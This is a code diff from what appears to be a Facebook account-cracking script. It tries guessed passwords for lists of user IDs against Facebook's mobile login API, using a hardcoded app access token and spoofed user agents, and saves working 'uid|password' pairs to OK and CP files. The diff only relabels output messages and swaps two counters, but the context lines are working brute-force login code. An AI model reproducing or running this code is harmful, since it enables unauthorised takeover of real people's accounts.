@@ -1304,7 +1304,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [+]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1321,13 +1321,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-FB-KING_🔥] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[OK-FB-KING_🔥] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("OK-FB-KING_🔥.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;33m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-FB-KING_🔥] %s | %s\033[1;31m         "%(uid, pw))
+				print("\r \033[1;33m[CP-FB-KING_🔥] %s | %s\033[1;31m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("CP.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
